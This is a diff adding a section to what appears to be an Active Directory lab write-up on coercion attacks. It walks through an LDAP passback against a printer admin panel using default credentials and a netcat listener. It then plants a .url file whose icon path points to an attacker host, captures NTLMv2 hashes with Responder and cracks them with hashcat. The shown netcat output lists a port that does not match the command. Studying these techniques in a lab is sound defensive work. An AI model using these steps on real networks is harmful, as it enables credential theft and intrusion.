@@ -229,6 +229,101 @@ SMB         192.168.12.100  445    RDC1             [-] thm.loc\amy.fisher:MegaC
 
 ## Coercion Attacks
 
+Coercion tricks a device or user into sending authentication material to an attacker-controlled listener instead of searching for credentials or spraying passwords.
+
+There are two coercion techniques covered in this room: LDAP passback attack against a misconfigured network printer, and file-based coercion on a writable file share.
+
+### LDAP Passback Attack
+
+Passback attacks involve the reconfiguring of network devices to send stored credentials to an attacker. Here is what it means, step by step:
+
+1. Access the device's web-based administration interface (the Embedded Web Service), often using default or weak credentials.
+2. Navigate to the LDAP configuration page.
+3. Replace the legitimate LDAP server IP address with our attacker machine's IP address.
+4. Trigger a connection test as most devices include a "Test Connection" or "Check Connection" button for exactly this purpose.
+5. The device sends the stored LDAP credentials to our listener, and we capture them.
+
+It works because most MFPs and IoT devices are among the most overlooked assets during security hardening. Common issues include:
+
+- Default admin credentials
+- Over-privileged service accounts
+- Plaintext LDAP (port 389)
+- No credential rotation
+
+### Practical Scenario
+
+1. First go to the simulated printer site: `http://printer.thm.loc/`.
+2. Then access the admin panel with credentials `admin:admin` and locate the LDAP configuration page. The current LDAP server IP and port, along with the service account username are visible there.
+3. Change the LDAP server IP address to the `tun0` IP of the room and a different port (such as 3489) and save these settings.
+4. And then the on a terminal, there should be a netcat listener listening on the same port.
+5. And if we do test connection on the configuration page, the device will attempt to authenticate to our listener using the stored LDAP credentials.
+
+The output would be similar to this:
+
+```bash
+nc -lvnp 3489
+listening on [any] 389 ...
+connect to [YOURIP] from (UNKNOWN) [PRINTERIP] 49562
+0Y`T;CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc<REDACTED_PASSWORD>
+```
+
+You can verify the captured password like this:
+
+```bash
+nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
+```
+
+### File-Based Coercion
+
+In file-based coercion, we place a specially crafted file on a writable network share. When a user browses that share using Windows Explorer, the operating system automatically attempts to render the file's icon. If the icon path points to a UNC path on our attacker machine (e.g., `\\TUN0_IP\share\icon.ico`), Windows will follow that path and send the browsing user's NTLMv2 hash to our listener, all without the user opening or clicking the file.
+
+### Creating a `.url` file
+
+You can create it with this:
+
+```bash
+cat > @Shortcut.url << 'EOF'
+[InternetShortcut]
+URL=http://thm.loc
+WorkingDirectory=thm
+IconFile=\\YOURTUN0IP\icons\icon.ico
+IconIndex=1
+EOF
+```
+
+Before we put the file and wait for the user to interact with this, we need to set up a listener just like above. But we will use responder. 
+
+```bash
+sudo responder -I tun0
+```
+
+To put the `.url` file:
+
+```bash
+smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
+smb: \> put @Shortcut.url
+putting file @Shortcut.url as \@Shortcut.url (X.X kb/s) (average X.X kb/s)
+smb: \> exit
+```
+
+And then, once the user interacts with the file, we should see the captured NTLMv2 hash in the responder terminal:
+
+```bash
+[SMB] NTLMv2-SSP Client   : 192.168.x.x
+[SMB] NTLMv2-SSP Username : THM\sarah.jones
+[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]
+```
+
+We can crack the hash using Hashcat like this:
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+You have to put the capture hash in the `hash.txt` file.
+
+These two techniques are just the tip of the iceberg when it comes to authentication coercion. More advanced techniques, including PetitPotam, PrinterBug/SpoolSample, and DFSCoerce, can force domain controllers and other high-value machines to authenticate to an attacker-controlled listener. Combined with relay attacks (where you forward the captured authentication rather than cracking it), these techniques form some of the most potent AD attack chains available today.
+
 ## Mitigations
 
 ## Conclusion
